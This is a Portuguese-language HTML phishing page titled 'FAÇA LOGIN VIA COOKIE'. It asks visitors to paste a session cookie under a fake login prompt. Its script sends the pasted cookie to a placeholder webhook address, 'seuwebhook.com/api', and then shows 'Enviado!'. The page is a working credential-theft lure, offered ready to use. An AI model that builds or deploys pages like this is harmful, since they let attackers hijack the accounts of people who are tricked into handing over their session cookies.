<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ðŸŽ­</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: radial-gradient(ellipse at bottom, #0d0d0d 0%, #000000 100%);
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }

    h1, h3 {
      text-shadow: 0 0 10px #ffffffaa;
    }

    textarea {
      width: 320px;
      height: 100px;
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      border: 1px solid #ffffff22;
      border-radius: 10px;
      padding: 10px;
      backdrop-filter: blur(4px);
      box-shadow: 0 0 10px #ffffff11;
    }

    button {
      margin-top: 10px;
      padding: 10px 20px;
      background: #ffffff22;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      text-shadow: 0 0 5px #fff;
      box-shadow: 0 0 10px #ffffff44;
      transition: all 0.2s;
    }

    button:hover {
      background: #ffffff33;
      box-shadow: 0 0 15px #ffffff88;
    }

    footer {
      margin-top: 40px;
      color: #999;
      font-size: 14px;
    }

    .stars {
      position: absolute;
      width: 100%;
      height: 100%;
      background: transparent url('https://i.imgur.com/MoqA3eK.png') repeat top center;
      animation: moveStars 60s linear infinite;
      z-index: -1;
      opacity: 0.15;
    }

    @keyframes moveStars {
      from { background-position: 0 0; }
      to { background-position: 10000px 5000px; }
    }
  </style>
</head>
<body>
  <div class="stars"></div>
  <h1>FAÃ‡A LOGIN</h1>
  <h3>VIA COOKIE</h3>
  <textarea placeholder="Cole o cookie aqui..."></textarea><br>
  <button onclick="enviar()">Enviar cookie</button>
  <footer>
    by menor dk ðŸ¥·
  </footer>

  <script>
    function enviar() {
      const cookie = document.querySelector('textarea').value;
      if (cookie.trim()) {
        fetch("https://seuwebhook.com/api", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cookie: cookie })
        });
        alert("Enviado!");
      } else {
        alert("Cola o cookie antes, DK.");
      }
    }
  </script>
</body>
</html>
